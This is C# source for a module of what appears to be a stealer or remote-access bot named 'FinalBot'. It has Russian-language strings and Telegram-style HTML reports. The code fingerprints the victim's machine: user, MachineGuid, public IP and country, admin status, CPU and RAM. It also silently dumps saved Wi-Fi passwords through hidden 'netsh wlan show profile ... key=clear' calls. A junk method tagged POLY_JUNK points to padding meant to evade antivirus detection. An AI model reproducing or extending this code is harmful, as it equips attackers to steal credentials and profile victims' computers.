using System;
using System.IO;
using System.Net;
using System.Text;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.Net.Http;
using System.Linq;
using System.Diagnostics;
using System.Text.RegularExpressions;
using System.Collections.Generic;
using System.Threading.Tasks;

namespace FinalBot.Modules
{
    public static class SystemInfoModule
    {
        // [POLY_JUNK]
        private static void _vanguard_54ed8aea() {
            int val = 58601;
            if (val > 50000) Console.WriteLine("Hash:" + 58601);
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        private class MEMORYSTATUSEX
        {
            public uint dwLength;
            public uint dwMemoryLoad;
            public ulong ullTotalPhys;
            public ulong ullAvailPhys;
            public ulong ullTotalPageFile;
            public ulong ullAvailPageFile;
            public ulong ullTotalVirtual;
            public ulong ullAvailVirtual;
            public ulong ullAvailExtendedVirtual;
            public MEMORYSTATUSEX()
            {
                this.dwLength = (uint)Marshal.SizeOf<MEMORYSTATUSEX>();
            }
        }

        [return: MarshalAs(UnmanagedType.Bool)]
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool GlobalMemoryStatusEx([In, Out] MEMORYSTATUSEX lpBuffer);

        public static string GetSystemInfo()
        {
            var (ip, country, flag) = GetCountryInfo();
            string adminStatus = VanguardCore.ElevationService.IsAdmin() ? "🟢 АДМИН" : "🟡 ЮЗЕР";

            var sb = new StringBuilder();
            sb.AppendLine("💎 <b>SYSTEM INFORMATION</b>");
            sb.AppendLine("━━━━━━━━━━━━━━━━━━");
            sb.AppendLine($"👤 <b>PC:</b> <code>{Environment.MachineName}\\{Environment.UserName}</code>");
            sb.AppendLine($"🆔 <b>HWID:</b> <code>{GetHWID()}</code>");
            sb.AppendLine($"🌐 <b>IP:</b> <code>{ip}</code> | {flag} {country}");
            sb.AppendLine($"🖥️ <b>Система:</b> <code>{GetFriendlyOSName()}</code>");
            sb.AppendLine($"⚡ <b>Статус:</b> <code>{adminStatus}</code>");
            sb.AppendLine($"🔋 <b>CPU:</b> <code>{GetCPUName()}</code>");
            sb.AppendLine($"🧠 <b>RAM:</b> <code>{GetTotalRAM()} GB</code>");
            sb.AppendLine("━━━━━━━━━━━━━━━━━━");
            
            return sb.ToString();
        }

        public static async Task<(string ip, string country, string flag)> GetCountryInfoAsync()
        {
            try
            {
                using (var client = new HttpClient())
                {
                    client.Timeout = TimeSpan.FromSeconds(5);
                    var response = await client.GetStringAsync("http://ip-api.com/json/");
                    
                    string ip = Regex.Match(response, "\"query\":\"(.*?)\"").Groups[1].Value;
                    string country = Regex.Match(response, "\"country\":\"(.*?)\"").Groups[1].Value;
                    string countryCode = Regex.Match(response, "\"countryCode\":\"(.*?)\"").Groups[1].Value.ToLower();
                    
                    if (string.IsNullOrEmpty(ip)) ip = "Unknown";
                    if (string.IsNullOrEmpty(country)) country = "Unknown";
                    
                    string flag = !string.IsNullOrEmpty(countryCode) ? GetFlagEmoji(countryCode) : "🏳️";
                    return (ip, country, flag);
                }
            }
            catch { return ("Unknown", "Unknown", "🏳️"); }
        }

        public static (string ip, string country, string flag) GetCountryInfo()
        {
            try { 
                var task = GetCountryInfoAsync();
                if (task.Wait(5000)) return task.Result;
                return ("Unknown", "Unknown", "🏳️");
            } catch { return ("Unknown", "Unknown", "🏳️"); }
        }

        public static string GetExternalIP()
        {
            try {
                using (var client = new HttpClient()) {
                    client.Timeout = TimeSpan.FromSeconds(5);
                    var task = client.GetStringAsync("https://api.ipify.org");
                    if (task.Wait(5000)) return task.Result;
                }
            } catch { }
            return "Unknown";
        }

        private static string GetFlagEmoji(string countryCode)
        {
            if (string.IsNullOrEmpty(countryCode) || countryCode.Length != 2) return "🏳️";
            countryCode = countryCode.ToUpper();
            int firstChar = countryCode[0] - 'A' + 0x1F1E6;
            int secondChar = countryCode[1] - 'A' + 0x1F1E6;
            return char.ConvertFromUtf32(firstChar) + char.ConvertFromUtf32(secondChar);
        }

        public static string GetFriendlyOSName()
        {
            try {
                using (var key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion")) {
                    if (key != null) {
                        var productName = key.GetValue("ProductName");
                        var displayVersion = key.GetValue("DisplayVersion") ?? key.GetValue("ReleaseId");
                        if (productName != null) {
                            string os = productName.ToString();
                            if (os.Contains("Windows 10") && Environment.OSVersion.Version.Build >= 22000)
                                os = os.Replace("Windows 10", "Windows 11");
                            return displayVersion != null ? $"{os} ({displayVersion})" : os;
                        }
                    }
                }
            } catch { }
            return Environment.OSVersion.ToString();
        }

        public static string GetHWID()
        {
            try {
                using (var key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Cryptography")) {
                    if (key != null) {
                        var val = key.GetValue("MachineGuid");
                        if (val != null) return val.ToString();
                    }
                }
            } catch { }
            return "Unknown";
        }

        private static string GetCPUName()
        {
            try {
                using (var key = Registry.LocalMachine.OpenSubKey(@"HARDWARE\DESCRIPTION\System\CentralProcessor\0")) {
                    if (key != null) {
                        var val = key.GetValue("ProcessorNameString");
                        if (val != null) return val.ToString().Trim();
                    }
                }
            } catch { }
            return "Unknown";
        }

        private static string GetTotalRAM()
        {
            try {
                MEMORYSTATUSEX memStatus = new MEMORYSTATUSEX();
                if (GlobalMemoryStatusEx(memStatus)) return (memStatus.ullTotalPhys / 1024 / 1024 / 1024).ToString();
            } catch { }
            return "Unknown";
        }

        public static string GetWifiProfiles()
        {
            var sb = new StringBuilder();
            sb.AppendLine("📶 <b>WIFI PROFILES</b>");
            sb.AppendLine("━━━━━━━━━━━━━━━━━━");
            try {
                var proc = new Process {
                    StartInfo = new ProcessStartInfo {
                        FileName = "netsh",
                        Arguments = "wlan show profiles",
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        CreateNoWindow = true
                    }
                };
                proc.Start();
                string output = proc.StandardOutput.ReadToEnd();
                proc.WaitForExit();

                var lines = output.Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.RemoveEmptyEntries);
                foreach (var line in lines) {
                    if (line.Contains(":") && (line.Contains("All User Profile") || line.Contains("Все профили пользователей"))) {
                        string name = line.Split(':')[1].Trim();
                        if (string.IsNullOrEmpty(name)) continue;

                        var p2 = new Process {
                            StartInfo = new ProcessStartInfo {
                                FileName = "netsh",
                                Arguments = $"wlan show profile name=\"{name}\" key=clear",
                                UseShellExecute = false,
                                RedirectStandardOutput = true,
                                CreateNoWindow = true
                            }
                        };
                        p2.Start();
                        string out2 = p2.StandardOutput.ReadToEnd();
                        p2.WaitForExit();

                        string pass = "None";
                        var m = Regex.Match(out2, "Key Content\\s+:\\s+(.*)");
                        if (m.Success) pass = m.Groups[1].Value.Trim();
                        else {
                            m = Regex.Match(out2, "Содержимое ключа\\s+:\\s+(.*)"); 
                            if (m.Success) pass = m.Groups[1].Value.Trim();
                        }
                        sb.AppendLine($"📡 <code>{name}</code> : <code>{pass}</code>");
                    }
                }
            } catch (Exception ex) { sb.AppendLine($"❌ Error: {ex.Message}"); }
            sb.AppendLine("━━━━━━━━━━━━━━━━━━");
            return sb.ToString();
        }
    }
}
